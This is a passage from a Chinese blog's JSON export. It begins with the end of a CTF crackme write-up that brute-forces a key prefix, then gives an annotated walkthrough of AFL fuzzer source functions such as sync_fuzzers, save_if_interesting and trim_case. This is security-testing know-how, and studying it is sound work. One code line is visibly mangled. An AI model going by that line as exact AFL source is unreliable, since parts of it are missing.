'KCTF381654729' text = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVMXYZ' result = itertools.permutations(text, 3) for x in result: prefix = ''.join(x) s = prefix + suffix #print(s) res = func(s) if res == 1: print(res, s) break ''' 参考链接： 简书：用Python进行排列组合 CSDN：Python使用itertools模块实现排列组合 CSDN：32位汇编语言学习笔记(11)–条件传送指令","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://cata1oc.github.io/tags/CTF/"},{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"}]},{"title":"AFL源码分析05：fuzz_one","slug":"AFL源码分析05","date":"2022-03-12T15:10:52.000Z","updated":"2022-05-17T15:56:28.375Z","comments":true,"path":"2022/03/12/AFL源码分析05/","link":"","permalink":"http://cata1oc.github.io/2022/03/12/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%9005/","excerpt":"","text":"前言本篇作为AFL源码分析的最后一篇，完成了对fuzz执行过程中的核心函数fuzz_one及其辅助函数（均位于文件afl-fuzz.c中，上一篇分析的主要是该文件中的fuzz初始化部分）的分析。在完整跟完一遍AFL源码后，不禁感叹于作者在代码设计上的巧妙以及将遗传算法应用在fuzz领域的绝佳构思。相信读者在阅读完这部分源码分析后也会有着相同的感受。 关键变量c1234567891011121314151617181920212223242526272829303132333435EXP_ST u32 exec_tmout = EXEC_TIMEOUT; /* Configurable exec timeout (ms) */static u32 hang_tmout = EXEC_TIMEOUT; /* Timeout used for hang det (ms) */static u32 stats_update_freq = 1; /* Stats update frequency (execs) */EXP_ST u8 skip_deterministic, /* Skip deterministic stages? */ force_deterministic, /* Force deterministic stages? */ use_splicing, /* Recombine input files? */ skip_requested, /* Skip request, via SIGUSR1 */EXP_ST u32 cur_skipped_paths, /* Abandoned inputs in cur cycle */ current_entry, /* Current queue entry ID */ queued_with_cov, /* Paths with new coverage bytes */ queued_discovered, /* Items discovered during this run */ pending_favored, /* Pending favored paths */ pending_not_fuzzed, /* Queued but not done yet */ EXP_ST u64 queue_cycle, /* Queue round counter */ cycles_wo_finds, /* Cycles without any new paths */ total_tmouts, /* Total number of timeouts */ unique_hangs, /* Hangs with unique signatures */ bytes_trim_in, /* Bytes coming into the trimmer */ bytes_trim_out, /* Bytes coming outa the trimmer */ trim_execs, /* Execs done to trim input files */ bytes_trim_in, /* Bytes coming into the trimmer */ bytes_trim_out, /* Bytes coming outa the trimmer */static u32 subseq_tmouts; /* Number of timeouts in a row */ static u8 *stage_name = \"init\", /* Name of the current fuzz stage */ *stage_short, /* Short stage name */ *syncing_party; /* Currently syncing with... */static s32 stage_cur, stage_max; /* Stage progression */static s32 splicing_with = -1; /* Splicing with which test case? */ 核心函数main(fuzz主循环部分)c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100u32 seek_to;seek_to = find_start_position();... while (1) { u8 skipped_fuzz; /* 1.首先调用cull_queue精简队列，筛选掉不是favored的case 2.如果queue_cur为空，说明所有queue都被执行完一轮，则： a.为新一轮fuzz做些准备： 1).设置计数器queue_cycle加1，表示所有queue被完整执行了多少轮 2).将用于表示当前queue下标的current_entry清零 3).将用于统计此轮fuzz废弃掉case个数的计数器cur_skipped_paths清零 4).令queue_cur指向fuzzing queue列表的第一个queue，准备开始新一轮fuzz b.如果seek_to不为空，说明此时为resuming_fuzz，则进入循环： 1).把queue_cur定位到seek_to指向的位置 2).同时current_entry也更新到queue_cur所在位置的下标 c.调用show_stats()刷新展示界面 d.如果不是终端模式（not_on_tty==1），则输出当前是第几轮fuzz */ cull_queue(); if (!queue_cur) { queue_cycle++; current_entry = 0; cur_skipped_paths = 0; queue_cur = queue; while (seek_to) { current_entry++; seek_to--; queue_cur = queue_cur->next; } show_stats(); if (not_on_tty) { ACTF(\"Entering queue cycle %llu.\", queue_cycle); fflush(stdout); } /* 如果完整的一轮fuzz没有发现新的路径，那么接下来尝试调整策略 1.判断queued_paths与prev_queued是否相等： a.若相等，表明在刚刚结束的一轮fuzz中没有发现新的路径（如果发现新的路径，则会在 save_if_interesting中会调用add_to_queue修改queued_paths的值），那么 接下来判断是否设置了use_splicing（如果没有指定'-M'或指定了'-d'则会设置其值）： 1).如果设置了，则将cycles_wo_finds加1 2).如果没设置，则设置use_spicing为1，表示接下来要通过splicing进行队列重组 b.若不等，说明有新路径发现，则设置cycle_wo_finds为0 2.用queued_paths去设置prev_queued的值 3.如果设置了sync_id（参数指定'-M'或'-S'），且queue_cycle为1，且设置了环境变量 AFL_IMPORT_FIRST；则调用sync_fuzzers从其它sync文件下的fuzzer中读取interesting 的case到自己的queue中 */ if (queued_paths == prev_queued) { if (use_splicing) cycles_wo_finds++; else use_splicing = 1; } else cycles_wo_finds = 0; prev_queued = queued_paths; if (sync_id && queue_cycle == 1 && getenv(\"AFL_IMPORT_FIRST\")) sync_fuzzers(use_argv); } /* 1.调用fuzz_one对queue_cur进行一次变异测试（fuzz_one并不一定真的执行当前queue_cur，它有 一定的策略；如果不执行，就直接返回1，否则返回0）， 上面的变异完成后，AFL会对文件队列的下一个进行变异处理。当队列中的全部文件都变异测试后，就完 成了一个”cycle”，这个就是AFL状态栏右上角的”cycles done”。而正如cycle的意思所说，整个队 列又会从第一个文件开始，再次进行变异，不过与第一次变异不同的是，这一次就不需要再进行 \"deterministic fuzzing\"了。如果用户不停止AFL，seed文件将会一遍遍的变异下去。 2.如果没有设置stop_soon，但是设置了sync_id，且fuzz_one返回0： a.令sync_interval_cnt加1（main函数开始时初始化为0） b.如果sync_interval_cnt能够被SYNC_INTERVAL(在config.h中定义为5)整除，那么调用 sync_fuzzers来同步其它fuzzer 3.如果没有设置stop_soon，但是设置了exit_1，则将stop_soon设置为2，并break出fuzz主循环 4.queue_cur指向fuzzing queue队列中的下一个queue，current_entry也随之自增1。准备测试 下一个queue */ skipped_fuzz = fuzz_one(use_argv); if (!stop_soon && sync_id && !skipped_fuzz) { if (!(sync_interval_cnt++ % SYNC_INTERVAL)) sync_fuzzers(use_argv); } if (!stop_soon && exit_1) stop_soon = 2; if (stop_soon) break; queue_cur = queue_cur->next; current_entry++;} sync_fuzzersc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151/* 这个函数的主要作用是进行queue同步，先读取有哪些fuzzer文件夹，然后读取其它fuzzer文件夹下的queue 文件夹中的测试用例，并依次执行一遍。如果执行过程中，发现这些测试用例可以触发新路径，则将测试用例保存 到自己的queue文件夹中，并将最后一个同步的测试用例的case_id写入到\".synced/d_name\"的文件中，以 避免重复运行*//* struct dirent { long d_ino; // 索引节点号 off_t d_off; // 在目录文件中的偏移 unsigned short d_reclen; // 文件名长 unsigned char d_type; // 文件类型 char d_name[NAME_MAX+1]; // 文件名，最长255字节 } */static void sync_fuzzers(char** argv) { DIR* sd; struct dirent* sd_ent; u32 sync_cnt = 0; /* 首先打开sync_dir文件夹 */ sd = opendir(sync_dir); if (!sd) PFATAL(\"Unable to open '%s'\", sync_dir); stage_max = stage_cur = 0; cur_depth = 0; /* 循环读取sync_dir目录下的所有文件（重点是其它fuzzer创建的文件夹） 1.跳过.开头的和当前fuzzer创建的文件（sync_dir != sd_ent->d_name） 2.跳过任何不包含queue子目录的文件夹，通过尝试打开\"sync_dir/d_name/queue\"文件夹。若打开失败， 说明不包含queue子目录 3.打开out_dir/.synced/d_name文件，读取前4个字节到变量min_accept中，然后调用lseek 调整文件内指针到开头，并设置next_min_accept的值为min_accept，这个值代表之前从这个 (queue)文件夹里读取到的最后一个queue的id 4.调整sync_cnt的值，显示现在同步到的阶段。并将stage_cur与stage_max清零 */ while ((sd_ent = readdir(sd))) { static u8 stage_tmp[128]; DIR* qd; struct dirent* qd_ent; u8 *qd_path, *qd_synced_path; u32 min_accept = 0, next_min_accept; s32 id_fd; if (sd_ent->d_name[0] == '.' || !strcmp(sync_id, sd_ent->d_name)) continue; qd_path = alloc_printf(\"%s/%s/queue\", sync_dir, sd_ent->d_name); if (!(qd = opendir(qd_path))) { ck_free(qd_path); continue; } qd_synced_path = alloc_printf(\"%s/.synced/%s\", out_dir, sd_ent->d_name); id_fd = open(qd_synced_path, O_RDWR | O_CREAT, 0600); if (id_fd < 0) PFATAL(\"Unable to create '%s'\", qd_synced_path); if (read(id_fd, &min_accept, sizeof(u32)) > 0) lseek(id_fd, 0, SEEK_SET); next_min_accept = min_accept; sprintf(stage_tmp, \"sync %u\", ++sync_cnt); stage_name = stage_tmp; stage_cur = 0; stage_max = 0; /* 接下来利用一个while循环检查此fuzzer对应的queue队列中的每个用例，解析ID并检查我们之前是否 查看过它；如果没有，则执行这个测试用例： 1.跳过.开头的文件和标识小于min_accept的文件（即已经sync过的文件） 2.如果标识syncing_case >= next_min_accept，就设置next_min_accept的值为syncing_case+1 3.开始同步case，先打开这个case文件，并获取文件状态 */ while ((qd_ent = readdir(qd))) { u8* path; s32 fd; struct stat st; if (qd_ent->d_name[0] == '.' || sscanf(qd_ent->d_name, CASE_PREFIX \"%06u\", &syncing_case) != 1 || syncing_case < min_accept) continue; if (syncing_case >= next_min_accept) next_min_accept = syncing_case + 1; path = alloc_printf(\"%s/%s\", qd_path, qd_ent->d_name); fd = open(path, O_RDONLY); if (fd < 0) { ck_free(path); continue; } if (fstat(fd, &st)) PFATAL(\"fstat() failed\"); /* 略过大小为0以及大小超过MAX_FILE（默认为1M）的文件， 然后对这个case作进一步判断： a.调用mmap映射这个case文件到mem中 b.调用write_to_testcase将这个case写入到out_file(在detect_file_args中，out_file 被设置为out_dir/.cur_input) c.调用run_target执行目标程序，监控超时情况，返回状态信息 d.判断一次stop_soon，如果设置了就返回 e.设置syncing_party为这个case在目录中的文件名 f.调用save_if_interesting来决定是否要导入这个文件到自己的queue里；如果发现了新的path 就导入。如果导入了会返回1，就令计数器queued_imported加1。 g.调用munmap解除这个case的映射 h.如果到了状态更新的周期(stats_update_freq默认为1)，则调用show_stats刷新一次界面 */ if (st.st_size && st.st_size d_name; queued_imported += save_if_interesting(argv, mem, st.st_size, fault); syncing_party = 0; munmap(mem, st.st_size); if (!(stage_cur++ % stats_update_freq)) show_stats(); } ck_free(path); close(fd); } /* 将当前的next_min_accept写入到id_fd指向的文件，也就是out_dir/.synced/d_name对应的文件 ，方便下次sync的时候，判断找到最后一个sync的case，以避免重复运行 */ ck_write(id_fd, &next_min_accept, sizeof(u32), qd_synced_path); close(id_fd); closedir(qd); ck_free(qd_path); ck_free(qd_synced_path); } closedir(sd);} save_if_interestingc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206/* 检查mem映射的这个case是否是interesting的，如果是，则将其保存到queue中，并返回1；否则返回0 */static u8 save_if_interesting(char** argv, void* mem, u32 len, u8 fault) { u8 *fn = \"\"; u8 hnb; s32 fd; u8 keeping = 0, res; /* 判断传入的参数fault是否为crash_mode，若是，则作进一步处理： 1.调用has_new_bits判断这个case是否触发了新的路径或者命中了已有的路径；若都没有触发，则判断是否 设置了crash_mode： a.如果设置了crash_mode，则令total_crashes加1，然后return 0 b.如果没设置crash_mode，直接return 0 2.拼接路径fn为\"out_dir/queue/id:00000queued_paths, describe_op(hub)\" 3.调用add_to_queue将case添加到队列里 4.如果hub值为2，说明发现了新的路径： a.将刚刚入队的q->has_new_cov的值设置为1 b.计数器queued_with_cov的值加1 5.计算trace_bits（当前run_target之后的tuple信息）的哈希值，保存到q->exec_cksum */ if (fault == crash_mode) { if (!(hnb = has_new_bits(virgin_bits))) { if (crash_mode) total_crashes++; return 0; } #ifndef SIMPLE_FILES fn = alloc_printf(\"%s/queue/id:%06u,%s\", out_dir, queued_paths, describe_op(hnb));#else fn = alloc_printf(\"%s/queue/id_%06u\", out_dir, queued_paths);#endif /* ^!SIMPLE_FILES */ add_to_queue(fn, len, 0); if (hnb == 2) { queue_top->has_new_cov = 1; queued_with_cov++; } queue_top->exec_cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST); /* 6.调用calibrate_case评估这个case， 7.若错误类型为FAULT_ERROR，则直接抛出异常\"无法执行目标程序\" 8.否则，创建fn路径指定的文件，并将case写入文件中 9.将keeping值设置为1（函数开始时被初始化为0） */ res = calibrate_case(argv, queue_top, mem, queue_cycle - 1, 0); if (res == FAULT_ERROR) FATAL(\"Unable to execute target application\"); fd = open(fn, O_WRONLY | O_CREAT | O_EXCL, 0600); if (fd < 0) PFATAL(\"Unable to create '%s'\", fn); ck_write(fd, mem, len, fn); close(fd); keeping = 1; } /* 以上为fault类型为crash_mode时的处理方式。其它fault类型，则进入switch中进行处理 */ switch (fault) { /* 我们对导致超时的case不是那么有兴趣，但我们仍然有义务保留少量样本，我们将特定于超时的位图中新位 的置位来作为唯一的信号；但是在dumb_mode下，保留所有case。具体操作如下： 1.total_tmouts计数器加1 2.如果unique_hangs >= KEEP_UNIQUE_HANG(能保存的最大数量，这个值在config.h中设置为500) ，就直接返回keeping(函数开始处初始化为0) 3.如果不是dumb_mode： a.调用simlify_trace对trace_bits进行规整(一种简化跟踪的操作，以加快执行速度) b.调用has_new_bits判断是否有新的超时路径，如果没有，直接返回keeping 4.令unique_tmouts计数器加1，如果不是dumb_mode，说明case发现了新的超时路径；对于dumb_mode ，则是保存发现的所有超时的case */ case FAULT_TMOUT: total_tmouts++; if (unique_hangs >= KEEP_UNIQUE_HANG) return keeping; if (!dumb_mode) {#ifdef WORD_SIZE_64 simplify_trace((u64*)trace_bits);#else simplify_trace((u32*)trace_bits);#endif /* ^WORD_SIZE_64 */ if (!has_new_bits(virgin_tmout)) return keeping; } unique_tmouts++; /* 在保存case之前，我们通过使用一个更大的超时时间重新执行程序，以确保它是一个真正的挂起（除非 默认超时已经很长），具体操作如下： 1.如果hang_tmout大于exec_tmout，则先将case的内容写到out_file中，然后以hang_tmout 为timeout，重新执行一次run_target a.如果没设置stop_soon，但是返回结果是FAULT_CRASH，则跳转到keep_as_crash；这是因 为增加超时时间可能会发现崩溃，这么做是为了确保不丢弃这个case b.如果设置了stop_soon，或者返回结果不是FAULT_TMOUT，就直接返回keeping 2.对于其它返回结果，则继续执行，首先拼接路径fn，用于将case写入 3.令unique_hangs计数器加1 4.更新last_hang_time为当前时间，然后从switch中break */ if (exec_tmout < hang_tmout) { u8 new_fault; write_to_testcase(mem, len); new_fault = run_target(argv, hang_tmout); if (!stop_soon && new_fault == FAULT_CRASH) goto keep_as_crash; if (stop_soon || new_fault != FAULT_TMOUT) return keeping; }#ifndef SIMPLE_FILES fn = alloc_printf(\"%s/hangs/id:%06llu,%s\", out_dir, unique_hangs, describe_op(0));#else fn = alloc_printf(\"%s/hangs/id_%06llu\", out_dir, unique_hangs);#endif /* ^!SIMPLE_FILES */ unique_hangs++; last_hang_time = get_cur_time(); break; /* CRASH的处理与超时的处理方式大体相似，除了略有不同的限制并且不需要重新运行测试用例。除此之外 当在超时处理中增加超时时间重新执行程序导致FAULT_CRASH时，也会进入这里进行处理: 1.total_crashes计数器加1 2.如果unique_crashes >= KEEP_UNIQUE_CRASH(能保存的最大数量，这个值在config.h中设 置为5000)，则直接返回keeping 3.与超时中的处理类似，如果不是dumb_mode，则调用simplify_trace对trace_bits进行规整； 接着调用has_new_bits判断这个case是否发现了新的crash路径，若没有就直接返回keeping 4.如果unique_crashes的值为0，则调用write_crash_readme显示一些crash目录的信息 5.拼接路径fn，用于后续将case写入 6.unique_crashes计数器加1 7.更新last_crash_time和last_crash_execs，然后从switch中break */ case FAULT_CRASH:keep_as_crash: total_crashes++; if (unique_crashes >= KEEP_UNIQUE_CRASH) return keeping; if (!dumb_mode) {#ifdef WORD_SIZE_64 simplify_trace((u64*)trace_bits);#else simplify_trace((u32*)trace_bits);#endif /* ^WORD_SIZE_64 */ if (!has_new_bits(virgin_crash)) return keeping; } if (!unique_crashes) write_crash_readme();#ifndef SIMPLE_FILES fn = alloc_printf(\"%s/crashes/id:%06llu,sig:%02u,%s\", out_dir, unique_crashes, kill_signal, describe_op(0));#else fn = alloc_printf(\"%s/crashes/id_%06llu_%02u\", out_dir, unique_crashes, kill_signal);#endif /* ^!SIMPLE_FILES */ unique_crashes++; last_crash_time = get_cur_time(); last_crash_execs = total_execs; break; /* 如果fault类型是FAULT_ERROR，则直接抛出异常 其它情况，直接返回keeping */ case FAULT_ERROR: FATAL(\"Unable to execute target application\"); default: return keeping; } /* 如果执行到这，显然是想保存导致crash或者hang的case，这里创建并打开fn路径指定的文件，并将 case的内容写入文件，最后返回keeping(这里keeping好像还是0，因此不会加入queue?) */ fd = open(fn, O_WRONLY | O_CREAT | O_EXCL, 0600); if (fd < 0) PFATAL(\"Unable to create '%s'\", fn); ck_write(fd, mem, len, fn); close(fd); ck_free(fn); return keeping;} simplify_tracec12345678910111213141516171819202122232425262728293031323334353637/* 用0x80/0x01表示替换原本tuple中表示路径是否被命中的信息，进而简化跟踪；这么做是为了在每次crash 或timeout被调用时加快执行速度。这里依旧只分析64位的情况*/static const u8 simplify_lookup[256] = { [0] = 1, [1 ... 255] = 128};#ifdef WORD_SIZE_64static void simplify_trace(u64* mem) { /* 1.8个字节为1组，每轮循环依次从trace_bits取出 2.如果mem不为空（即这一组8个字节中至少有一个字节有值），则利用simplify_lookup表对其进行规整。 如果路径没有命中，就设置为0x1；如果路径命中了，就设置为0x80 3.否则，将mem设置为0x0101010101010101，即所有8个字节代表的路径都没有命中 */ u32 i = MAP_SIZE >> 3; while (i--) { if (unlikely(*mem)) { u8* mem8 = (u8*)mem; mem8[0] = simplify_lookup[mem8[0]]; mem8[1] = simplify_lookup[mem8[1]]; mem8[2] = simplify_lookup[mem8[2]]; mem8[3] = simplify_lookup[mem8[3]]; mem8[4] = simplify_lookup[mem8[4]]; mem8[5] = simplify_lookup[mem8[5]]; mem8[6] = simplify_lookup[mem8[6]]; mem8[7] = simplify_lookup[mem8[7]]; } else *mem = 0x0101010101010101ULL; mem++; }} trim_case在fuzz_one中(5119行)被调用 c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137/* 在进行确定性检查(deterministic checks)时，修剪所有新的测试用例以节省周期。微调器将使用 1/1024~1/16之间的一个二次幂增量，使得执行周期变得简短而又温馨，至少它很简短。这里的参数 in_buf，实际上就是calibrate_case中的参数use_mem，也就是q->len */static u8 trim_case(char** argv, struct queue_entry* q, u8* in_buf) { static u8 tmp[64]; static u8 clean_trace[MAP_SIZE]; u8 needs_write = 0, fault = 0; u32 trim_exec = 0; u32 remove_len; u32 len_p2; /* 虽然当检测到可变行为时，修剪器的用处不大，但它仍然会在一定程度上起作用，所以我们不检查这个 1.如果case的len小于5字节，就不需要修剪，直接返回 2.令stage_name指向tmp数组首位；修剪字节计数器bytes_trim_in的值增加q->len个大小 3.选择初始块len_p2的长度，其值是大于等于q->len的第一个2的幂次(如果len是666，len_p2就是1024) 4.设置起始步长remove_len的值，从\"len_p2/16\"和\"4\"中选取最大的那个。这里用到的两个宏都可在 config.h中找到 */ if (q->len < 5) return 0; stage_name = tmp; bytes_trim_in += q->len; len_p2 = next_p2(q->len); remove_len = MAX(len_p2 / TRIM_START_STEPS, TRIM_MIN_BYTES); /* 进入循环，直至步长remove_len(每轮循环会除2)小于终止步长MAX(len_p2/1024, 4)时停止： 1.remove_pos保存当前的remove_len 2.格式化remove_len到tmp中，相当于令stage_name = \"trim remove_len/remove_len\"，需要注意一点 前面已经将stage_name指向了tmp的首地址 3.将stage_cur置零，stage_max设置为q->len/remove_len(如果remove_len是用TRIM_START_SETPS 计算出来的，那么这个值为8~15之间的一个数) */ while (remove_len >= MAX(len_p2 / TRIM_END_STEPS, TRIM_MIN_BYTES)) { u32 remove_pos = remove_len; sprintf(tmp, \"trim %s/%s\", DI(remove_len), DI(remove_len)); stage_cur = 0; stage_max = q->len / remove_len; /* 进入内层循环，每次前进remove_len个步长，直至整个文件都遍历完(remove_pos >= q->len)为止 1.设置trim_avail为一块较小的片段长度 2.调用write_with_gap()，具体操作为，由in_buf中remove_pos处开始，向后跳过remove_len个字 节，写入到.cur_input里 3.调用run_target运行一次目标程序，trim_execs计数器加1，然后处理潜在的错误（可以理解为，将 case删除了一小段。然后再执行下，看看对跟踪是否产生影响，若无影响，则保将删除后的case，尽管 这么做对可变路径variable-path来说并不完美） */ while (remove_pos < q->len) { u32 trim_avail = MIN(remove_len, q->len - remove_pos); u32 cksum; write_with_gap(in_buf, q->len, remove_pos, trim_avail); fault = run_target(argv, exec_tmout); trim_execs++; if (stop_soon || fault == FAULT_ERROR) goto abort_trimming; /* 4.用当前的trace_bits计算出一个哈希值，保存到cksum中。（注意，原生的AFL在此处不会跟踪崩溃 或挂起） 5.判断cksum和q->exec_cksum的值是否相等，即将case删减一小段后是否对trace产生影响： a.如果相等，说明不产生影响，则： 1).计算in_buf中从remove_pos开始，到结尾剩余的长度（删除trim_avail后），并将其赋给 局部变量move_tail 2).重新设置q->len和len_p2，即从case删除trim_avail剩余的长度，这里的对len_p2的修 改可能会触发外层循环的终止条件 3).调用memmove，安全的将case中trim_avail片段之后，move_tail大小的内容附加到原先从 trim_avail开始的位置 4).如果未设置needs_write，则将其置1；然后用一个干净的clean_trace保存trace_bits中 的值，一旦完成修剪操作后，updata_bitmap_score就会根据trace_bits和偏好因子进一 步筛选queue，并对trace_bits进行压缩 b.如果不相等，说明case删减会对trace产生影响，则这段不删减，remove_pos加上步长的值 6.由于trim过程可能比较慢，所以如果达到stats_update_freq更新周期，就调用show_stats()刷新 一次并显示界面（由于stats_update_freq的值为1，所以时不时就刷新一次）；同时，trim_exec 的值自增1，表示执行了一次修剪。 7.stage_cur的值加1，然后进入下一轮内层循环 8.令循环步长remove_len除2，然后进入下一轮外层循环 */ cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST); if (cksum == q->exec_cksum) { u32 move_tail = q->len - remove_pos - trim_avail; q->len -= trim_avail; len_p2 = next_p2(q->len); memmove(in_buf + remove_pos, in_buf + remove_pos + trim_avail, move_tail); if (!needs_write) { needs_write = 1; memcpy(clean_trace, trace_bits, MAP_SIZE); } } else remove_pos += remove_len; if (!(trim_exec++ % stats_update_freq)) show_stats(); stage_cur++; } remove_len >>= 1; } /* 如果对in_buf做了修改（说明trim后不影响，不然就不修改了），那也要对磁盘中保存的case版本进行更新： 1.删除原来的q->fname，创建一个新的q->fname，将in_buf里的内容写入q-> 2.用clean_trace恢复trace_bits的值；调用update_bitmap_score根据偏好因子更新bitmap */ if (needs_write) { s32 fd; unlink(q->fname); /* ignore errors */ fd = open(q->fname, O_WRONLY | O_CREAT | O_EXCL, 0600); if (fd < 0) PFATAL(\"Unable to create '%s'\", q->fname); ck_write(fd, in_buf, q->len, q->fname); close(fd); memcpy(trace_bits, clean_trace, MAP_SIZE); update_bitmap_score(q); } /* 对fault的一些处理，字节修剪计数器bytes_trim_out的值增加q->len个大小 */abort_trimming: bytes_trim_out += q->len; return fault;} calculate_score在fuzz_one中(5143行)被调用 c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/* 根据queue entry的执行速度、覆盖到的path数和路径深度来评估出一个得分，这个得分perf_score在后面havoc的 时候使用 */static u32 calculate_score(struct queue_entry* q) { u32 avg_exec_us = total_cal_us / total_cal_cycles; u32 avg_bitmap_size = total_bitmap_size / total_bitmap_entries; u32 perf_score = 100; /* 基于case的执行速度对得分perf_score进行调整，将case执行速度与系数相乘（0.1~4）后再与平均值 （total_cal_us/total_cal_cycles）进行对比。由于快速输入的fuzz成本更低，因而会给他们更多 的air time */ if (q->exec_us * 0.1 > avg_exec_us) perf_score = 10; else if (q->exec_us * 0.25 > avg_exec_us) perf_score = 25; else if (q->exec_us * 0.5 > avg_exec_us) perf_score = 50; else if (q->exec_us * 0.75 > avg_exec_us) perf_score = 75; else if (q->exec_us * 4 < avg_exec_us) perf_score = 300; else if (q->exec_us * 3 < avg_exec_us) perf_score = 200; else if (q->exec_us * 2 < avg_exec_us) perf_score = 150; /* 基于case的bitmap覆盖率对得分perf_score进行调整，原理是更好的覆盖率可以转化为更好的目标； 具体操作与上面基于执行速度的类似，这里不展开 */ if (q->bitmap_size * 0.3 > avg_bitmap_size) perf_score *= 3; else if (q->bitmap_size * 0.5 > avg_bitmap_size) perf_score *= 2; else if (q->bitmap_size * 0.75 > avg_bitmap_size) perf_score *= 1.5; else if (q->bitmap_size * 3 < avg_bitmap_size) perf_score *= 0.25; else if (q->bitmap_size * 2 < avg_bitmap_size) perf_score *= 0.5; else if (q->bitmap_size * 1.5 < avg_bitmap_size) perf_score *= 0.75; /* 基于handicap调整得分perf_score，handicap表示相对于其它case，这个case迟了多久我们才能了解它 的路径（这个值仅在calibrate_case中被设置，初始为0，后为queue_cycle-1），迟到者可以多跑一段时 间，直到赶上其他人。 */ if (q->handicap >= 4) { perf_score *= 4; q->handicap -= 4; } else if (q->handicap) { perf_score *= 2; q->handicap--; } /* 基于输入深度对得分最出最终调整，这里假设在进行模糊测试时，更深入的测试用例更有可能发现传统模拟器无 法发现的东西。这个cur_depth是一个全局变量，初始为0；每次add_to_queue时，会设置cur_depth+1： 1.处理输入时： 在read_testcases时会调用add_to_queue，此时所有的input_case的q->depth都会被设置为1 2.fuzz_one时： 在fuzz_one时，会先设置cur_depth为当前queue的q->depth，然后这个queue经过mutate之后调用 save_if_interesting；如果是interesting_case，就会被add_to_queue，此时就建立起了queue 之间的关联关系，所以由当前queue经过mutate后加入的新queue，深度都在当前queue的基础上再增加 */ switch (q->depth) { case 0 ... 3: break; case 4 ... 7: perf_score *= 2; break; case 8 ... 13: perf_score *= 3; break; case 14 ... 25: perf_score *= 4; break; default: perf_score *= 5; } /* 确保得分perf_score不会超过限制，然后返回得分 */ if (perf_score > HAVOC_MAX_MULT * 100) perf_score = HAVOC_MAX_MULT * 100; return perf_score;} common_fuzz_stuff在fuzz_one中(5188行)多次被调用，首次出现在5188行 c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657/* 编写修改后的testcase，运行程序，处理结果以及异常情况。如需退出，则返回1，这同样是fuzz_one中 的一个辅助函数。这里的out_buf，同样可以理解为use_mem，参考前面的trim_case */EXP_ST u8 common_fuzz_stuff(char** argv, u8* out_buf, u32 len) { u8 fault; /* 如果设置了post_handler（在setup_post中设置），就通过post_handler处理一下out_buf；处理 后判断out_buf及len的值，若有一个为0，则直接返回0。sakura指出 \"如果需要对变异完的queue，做 一层wrapper再写入的时候，这里其实很有价值\" */ if (post_handler) { out_buf = post_handler(out_buf, &len); if (!out_buf || !len) return 0; } /* 1.调用write_to_testcase将当前case写入到out_file 2.执行一次run_target 3.判断fault类型： a.如果是FAULT_TMOUT。则令连续超时数计数器subseq_tmouts的值加1，如果大于TMOUT_LIMIT （默认250），则令当前cycle被抛弃inputs计数器cur_skipped_paths的值加1；然后直接返回1 b.其它fault类型，则将subseq_tmouts置零 */ write_to_testcase(out_buf, len); fault = run_target(argv, exec_tmout); if (stop_soon) return 1; if (fault == FAULT_TMOUT) { if (subseq_tmouts++ > TMOUT_LIMIT) { cur_skipped_paths++; return 1; } } else subseq_tmouts = 0; /* 如果用户通过SIGUSR1来请求抛弃当前的input，则会设置skip_requested值；若设置了该值，则： 1.将skip_requested清零 2.令当前cycle被抛弃inputs计数器cur_skipped_paths的值加1 3.返回1 */ if (skip_requested) { skip_requested = 0; cur_skipped_paths++; return 1; } /* 接下来处理FAULT_ERROR： 1.调用一次save_if_interesting，如果返回1，即该case被认为是\"有趣的\"，则queued_discovered加1 2.如果进入了更新周期，则调用show_stats更新展示界面 */ queued_discovered += save_if_interesting(argv, out_buf, len, fault); if (!(stage_cur % stats_update_freq) || stage_cur + 1 == stage_max) show_stats(); return 0;} choose_block_len在fuzz_one中多次被调用，首次出现在6352行 c123456789101112131415161718192021222324252627282930313233343536373839404142434445/* 该函数用于帮助fuzz_one中的块操作选择随机块的长度，会返回一个大于0的值 */static u32 choose_block_len(u32 limit) { /* 1.设置rlim的值为queue_cycle和3中更小的那一个 2.如果run_over10m为0（这个值表示是否超时超过10min），则设置rlim的值为1 3.接下来进入switch语句，对不同分支进行判断。这里的UR定义在afl-fuzz.c的371行，用于生成一个（范围 在0~rlim-1）随机数： case 0: 设置min_value为1，max_value为32 case 1: 设置min_value为32，max_value为128 default: 有9/10的概率，设置min_value为128，max_value为1500 有1/10的概率，设置min_value为1500，max_value为32768 4.如果min_value >= 传入的参数limit，则设置min_value的值为0 5.min_value加上一个随机值作为返回值，因为返回值 >= 1 */ u32 min_value, max_value; u32 rlim = MIN(queue_cycle, 3); if (!run_over10m) rlim = 1; switch (UR(rlim)) { case 0: min_value = 1; max_value = HAVOC_BLK_SMALL; break; case 1: min_value = HAVOC_BLK_SMALL; max_value = HAVOC_BLK_MEDIUM; break; default: if (UR(10)) { min_value = HAVOC_BLK_MEDIUM; max_value = HAVOC_BLK_LARGE; } else { min_value = HAVOC_BLK_LARGE; max_value = HAVOC_BLK_XL; } } if (min_value >= limit) min_value = 1; return min_value + UR(MIN(max_value, limit) - min_value + 1);} fuzz_oneAFL中最长的函数(4999~6690)，也是fuzz执行流程中最核心函数。这里按照阶段分布展开分析 